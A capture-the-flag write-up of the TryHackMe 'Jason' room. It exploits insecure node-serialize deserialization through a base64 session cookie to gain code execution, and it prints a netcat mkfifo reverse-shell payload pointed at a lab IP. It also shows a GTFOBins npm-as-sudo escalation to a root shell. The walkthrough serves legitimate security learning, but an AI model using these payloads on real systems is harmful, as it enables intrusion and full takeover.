# **Description**

Hello hackers, I hope you are doing well. We are doing [Jason](https://tryhackme.com/room/jason) from [TryHackMe](https://tryhackme.com). We find a node.js web site vulnerable to deserialization allowing remote code execution that leads to foothold. On the target box we can run npm as root so we exploit that to get a root shell.

# **Enumeration**

## nmap

We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
Nmap scan report for 10.10.239.172

```

We found two open ports, 22 running OPENSSH and 80 is an http web server.

## Web

Let's navigate to the web page.

![](1.png)

The website is not completed yet, and we can sign up for a newsletter. Let's submit an email and intercept the request with burp.

![](2.png)

After submitting the email, we get a session cookie which is a base64 of `{"email":"hi@hi.me"}`

Now if we go to the website we can see our email

![](3.png)

# **Foothold**

With the help of this [article](https://medium.com/@chaudharyaditya/insecure-deserialization-3035c6b5766e), let's test if the website is vulnerable to deserialization.

We use the following payload that will return the word `HACKED` if there is a vulnerability.

```javascript
_$$ND_FUNC$$_function (){ return 'HACKED'; }()
```

Let's put it in the email field.

```json
{"email":"_$$ND_FUNC$$_function (){ return 'HACKED'; }()"}
```

And encode it with base64.

```text
eyJlbWFpbCI6Il8kJE5EX0ZVTkMkJF9mdW5jdGlvbiAoKXsgcmV0dXJuICdIQUNLRUQnOyB9KCkifQ==
```

Now we replace the old cookie with the one we just created and send a request.

![](4.png)

We got the word `HACKED` back, this means the website is vulnerable.

Now let's use another payload that give us remote code execution.

```javascript
_$$ND_FUNC$$_function(){require('child_process').exec('CMD', function(error,stdout, stderr) { console.log(stdout) });}()
```

We need to replace `CMD` with the command we want to execute, and in this case we can try getting a reverse shell using `nc mkfifo`

```js
_$$ND_FUNC$$_function(){require('child_process').exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.9.76.240 9000 >/tmp/f', function(error,stdout, stderr) { console.log(stdout) });}()
```

Let's put the code above in the email field and encode it with base64 then send the request after setting up a netcat listener.

We got a shell as `dylan`.

# **Privilege Escalation**

## Shell upgrade

On dylan's home directory i created a `.ssh` directory and uploaded my public key to it.

![](6.png)

Now used my private key to ssh as dylan.

![](7.png)

## dylan -->  root

Now let's check our privilege

```terminal
dylan@jason:~$ sudo -l
Matching Defaults entries for dylan on jason:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User dylan may run the following commands on jason:
    (ALL) NOPASSWD: /usr/bin/npm *
```

We can run `npm` as root, checking [GTFOBins](https://gtfobins.github.io/gtfobins/npm/#sudo) we find a way to exploit that and get root.

```bash
TF=$(mktemp -d)
echo '{"scripts": {"preinstall": "/bin/sh"}}' > $TF/package.json
sudo npm -C $TF --unsafe-perm i
```

The `TF=$(mktemp -d)` makes a temporary directory.

In `{"scripts": {"preinstall": "/bin/sh"}}`, the `scripts` object is used to define custom commands, and the `preinstall` is a key used to define a command that will be run before any packages, and in our case it's `/bin/sh` that gives us a root shell.

We put the script in `package.json` file that will be located in the temporary directory.

the `-C` option specifies the working directory. The `--unsafe-perm` is to run the scripts with root privileges and the `i` is for install

We got root!
